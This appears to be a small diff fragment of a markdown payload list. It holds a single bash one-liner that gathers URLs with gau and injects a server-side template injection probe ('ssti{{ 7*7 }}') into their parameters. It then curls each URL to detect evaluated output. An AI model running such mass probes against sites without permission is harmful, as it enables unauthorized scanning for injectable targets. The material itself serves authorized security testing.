@@ -1,5 +1,5 @@
-```
 ## Multiple URL Test Payload:
+
 
 ```bash
 cat urls.txt | gau -subs | grep '=' | egrep -v '(.js|.png|.svg|.gif|.jpg|.jpeg|.txt|.css|.ico)' | qsreplace "ssti{{ 7*7 }}" | while read url; do cur=$(curl -s "$url" | grep "ssti49"); echo -e "$url -> $cur"; done
